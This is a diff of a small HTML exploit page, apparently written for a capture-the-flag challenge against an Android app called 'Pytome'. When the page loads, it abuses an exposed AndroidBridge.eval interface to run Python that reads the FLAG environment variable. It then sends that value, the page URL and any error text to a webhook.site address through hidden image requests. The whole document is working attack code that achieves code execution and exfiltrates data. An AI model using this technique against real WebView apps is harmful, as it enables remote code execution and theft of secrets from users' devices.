@@ -1,36 +1,65 @@
 <!doctype html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>Pytome</title>
+    <meta charset="utf-8">
+    <title>Pytome</title>
 </head>
 <body>
 <pre id="status">Запуск...</pre>
 
 <script>
-const receiver = "https://webhook.site/603368f2-52be-49b3-812b-91e77b91c6c9";
+const receiver =
+    "https://webhook.site/603368f2-52be-49b3-812b-91e77b91c6c9";
+
+function send(params) {
+    params.time = Date.now();
+
+    const img = document.createElement("img");
+    img.style.display = "none";
+    img.src = receiver + "?" + new URLSearchParams(params).toString();
+
+    document.body.appendChild(img);
+}
+
+send({
+    stage: "page_loaded",
+    href: location.href
+});
 
 try {
-    if (!window.AndroidBridge) {
-        document.getElementById("status").textContent =
-            "AndroidBridge отсутствует — страница открыта не внутри Pytome";
-    } else {
-        const result = String(
-            window.AndroidBridge.eval(
-                "print(import('os').environ.get('FLAG', 'NO_FLAG'))"
-            )
-        ).trim();
+    if (!window.AndroidBridge) {
+        document.getElementById("status").textContent =
+            "AndroidBridge отсутствует";
 
-        document.getElementById("status").textContent = result;
+        send({
+            stage: "no_bridge"
+        });
+    } else {
+        send({
+            stage: "bridge_found"
+        });
 
-        location.replace(
-            receiver + "?flag=" + encodeURIComponent(result)
-        );
-    }
+        const result = String(
+            window.AndroidBridge.eval(
+                "print(__import__('os').environ.get('FLAG', 'NO_FLAG'))"
+            )
+        ).trim();
+
+        document.getElementById("status").textContent = result;
+
+        send({
+            stage: "result",
+            flag: result
+        });
+    }
 } catch (e) {
-    location.replace(
-        receiver + "?error=" + encodeURIComponent(String(e))
-    );
+    document.getElementById("status").textContent =
+        "Ошибка: " + String(e);
+
+    send({
+        stage: "error",
+        error: String(e)
+    });
 }
 </script>
 </body>
